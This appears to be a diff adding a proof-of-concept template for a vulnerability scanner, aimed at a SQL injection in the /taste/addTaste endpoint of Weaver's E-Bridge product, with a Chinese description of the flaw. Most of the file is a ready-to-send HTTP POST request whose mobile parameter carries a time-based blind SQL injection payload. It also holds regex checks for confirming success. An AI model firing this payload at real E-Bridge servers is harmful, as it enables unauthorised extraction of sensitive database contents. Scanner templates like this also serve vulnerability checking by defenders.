@@ -1,0 +1,15 @@
+﻿<DudePoc_Name>泛微 E-Bridge addTaste SQL注入漏洞</DudePoc_Name>
+<DudePoc_Description>上海泛微网络科技股份有限公司云桥e-Bridge /addTaste 存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /taste/addTaste?company=111&userName=111&openid=111&source=111&mobile=111%27%20AND%20(SELECT%207604%20FROM%20(SELECT(SLEEP(1)))ZQXL)--%20YAby HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>^(?=.*?FILTERED)(?=.*?true).*?$</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
